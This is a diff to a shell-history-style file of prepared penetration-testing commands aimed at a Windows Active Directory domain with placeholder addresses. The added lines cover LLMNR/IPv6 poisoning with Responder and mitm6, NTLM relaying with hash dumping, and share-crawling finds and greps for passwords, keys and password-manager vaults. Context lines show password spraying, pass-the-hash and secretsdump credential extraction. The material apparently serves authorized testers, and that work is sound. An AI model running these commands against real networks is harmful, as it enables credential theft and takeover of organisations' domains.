@@ -1,20 +1,9 @@
-: 1773000000:0;python3 -m venv .venv
-: 1773000000:0;source .venv/bin/activate
-: 1773000000:0;pip install lib
-: 1773000000:0;pip install -r requirements.txt
-: 1773000000:0;sudo apt install pkg
-: 1773000000:0;cd cyber
-: 1773000000:0;cd host
-: 1773000000:0;cd /opt/
-: 1773000000:0;ls -la ./
-: 1773000000:0;cat file.txt
-: 1773000000:0;curl ifconfig.me
-: 1773000000:0;dig dokalibz.local @9.9.9.9
-: 1773000000:0;ping -c 3 9.9.9.9
-: 1773000000:0;export KRB5CCNAME=ticket.ccache
-: 1773000000:0;sudo nano /etc/hosts
-: 1773000000:0;sudo nano /etc/resolv.conf
-: 1773000000:0;sudo nano /usr/lib/ssl/openssl.cnf
+: 1773000000:0;rgrep -H -T --color=auto --exclude '*_hist*' -E '(pass|mdp|PRIVATE|root)' ./manspider
+: 1773000000:0;find ./manspider -type f \( -iname "*pass*" -o -iname "*secret*" -o -iname "*key*" -o -iname "*cle*" -o -iname "*mdp*" -o -iname "*user*" -o -iname "*admin*" -o -iname "*account*" -o -iname "*login*" -o -iname "*cred*" -o -iname "*env*" -o -iname "*hist*" -o -iname "*profil*" -o -iname "*id_*" -o -iname "*ssh*" \) -exec ls --color {} \; 2>/dev/null
+: 1773000000:0;find ./manspider -type f \( -iname "*.kdbx" -o -iname "*.kdb" -o -iname "*.1pif" -o -iname "*.agilekeychain" -o -iname "*.opvault" -o -iname "*.lpd" -o -iname "*.dashlane" -o -iname "*.psafe3" -o -iname "*.enpass" -o -iname "*.bwdb" -o -iname "*.msecure" -o -iname "*.stickypass" -o -iname "*.pwm" -o -iname "*.rdb" -o -iname "*.safe" -o -iname "*.zps" -o -iname "*.pmvault" -o -iname "*.mywallet" -o -iname "*.jpass" -o -iname "*.pwmdb" \) -exec ls --color {} \; 2>/dev/null
+: 1773000000:0;find ./manspider -type f \( -iname "*.bat" -o -iname "*.vbs" -o -iname "*.ps1" -o -iname "*.psd1" -o -iname "*.psm1" -o -iname "*.sh" -o -iname "*.sql" \) -exec ls --color {} \; 2>/dev/null
+: 1773000000:0;find ./manspider -type f \( -iname "*.conf" -o -iname "*.config" -o -iname "*.yml" -o -iname "*.yaml" -o -iname "*.db" -o -iname "*.sql*" \) -exec ls --color {} \; 2>/dev/null
+: 1773000000:0;nano ./.local/share/pipx/venvs/responder-poisoner/lib/python3.13/site-packages/Responder.conf
 : 1773000000:0;rce -d dokalibz.local
 : 1773000000:0;oke -f 4 'Dokalibz :)'
 : 1773000000:0;oke '<'
@@ -49,8 +38,16 @@
 : 1773000000:0;nxc smb 10.20.30.40 --dpapi -d "$dom" -u "$user" -p "$pass"
 : 1773000000:0;nxc smb 10.20.30.40 -d "$dom" -u "$user" -H "HASH"
 : 1773000000:0;nxc smb 10.20.30.40 --local-auth -u 'Administrator' -p 'password'
+: 1773000000:0;nxc smb --gen-relay-list smb-relays.txt 10.20.30.0/24
 : 1773000000:0;nxc smb "$dc" --use-kcache
 : 1773000000:0;spray.sh -smb "$dc" users.txt passwords.txt AttemptsPerLockoutPeriod LockoutPeriodInMinutes "$dom"
+: 1773000000:0;sudo responder -I eth0 -b -w
+: 1773000000:0;responder -I eth0 -b -w
+: 1773000000:0;sudo responder -I eth0
+: 1773000000:0;responder -I eth0
+: 1773000000:0;sudo mitm6 -i eth0 -d "$dom"
+: 1773000000:0;mitm6 -i eth0 -d "$dom"
+: 1773000000:0;ntlmrelayx.py -tf smb-relays.txt --dump-hashes -smb2support -socks --keep-relaying
 : 1773000000:0;smbclient.py "$dc" -k -no-pass
 : 1773000000:0;secretsdump.py -hashes ':HASH' "$dom/$user@10.20.30.40"
 : 1773000000:0;addspn.py -u "$dom\$user" -p "$pass" --target-type samname -t 'TARGET' -s 'SPN' "$dc"
@@ -68,8 +65,31 @@
 : 1773000000:0;ldeep ldap -s 10.20.30.40 -d "$dom" -u "$user" -p "$pass" search '(name=doka)' 'memberOf'
 : 1773000000:0;gpoParser display -c GPOs.py
 : 1773000000:0;gpoParser remote -s "$dc" -d "$dom" -u "$user" -p "$pass" -o GPOs.json
+: 1773000000:0;manspider -e bat com vbs txt sh ps1 psd1 psm1 pem key rsa pub reg pfx cfg conf config yml yaml vmdk vhd vdi dit ppk rsa ssh rsa p12 pkcs12 crt cer csr jks keystore keys der kdbx kdb 1pif agilekeychain opvault lpd dashlane psafe3 enpass bwdb msecure stickypass pwm rdb safe zps pmvault mywallet jpass pwmdb keytab ccache kirbi -o -f passw passe secret key cle mdp user admin account login cred sql env hist profil id_rsa id_dsa id_ed25519 -d "$dom" -u "$user" -p "$pass" 10.20.30.40
 : 1773000000:0;nxc smb 10.20.30.0/24 --generate-hosts-file ./hosts.txt
 : 1773000000:0;nxc smb 10.20.30.0/24 -d "$dom" -u "$user" -p "$pass"
+: 1773000000:0;python3 -m venv .venv
+: 1773000000:0;source .venv/bin/activate
+: 1773000000:0;pip install lib
+: 1773000000:0;pip install -r requirements.txt
+: 1773000000:0;sudo apt install pkg
+: 1773000000:0;cd cyber
+: 1773000000:0;cd host
+: 1773000000:0;cd /opt/
+: 1773000000:0;ls -la ./
+: 1773000000:0;cat file.txt
+: 1773000000:0;curl ifconfig.me
+: 1773000000:0;dig dokalibz.local @9.9.9.9
+: 1773000000:0;ping -c 3 9.9.9.9
+: 1773000000:0;export KRB5CCNAME=ticket.ccache
+: 1773000000:0;find ./ -type f \( -iname "*.conf" -o -iname "*.config" \) -exec ls --color {} \; 2>/dev/null
+: 1773000000:0;grep -H -T --color=auto -E '(pass|root)' ./file.txt
+: 1773000000:0;nano /etc/hosts
+: 1773000000:0;sudo nano /etc/hosts
+: 1773000000:0;nano /etc/resolv.conf
+: 1773000000:0;sudo nano /etc/resolv.conf
+: 1773000000:0;sudo nano /usr/lib/ssl/openssl.cnf
+: 1773000000:0;nano /usr/lib/ssl/openssl.cnf
 : 1773000000:0;export net="10.20.30.0/24"
 : 1773000000:0;export dc="10.20.30.40"
 : 1773000000:0;export dom="domain"
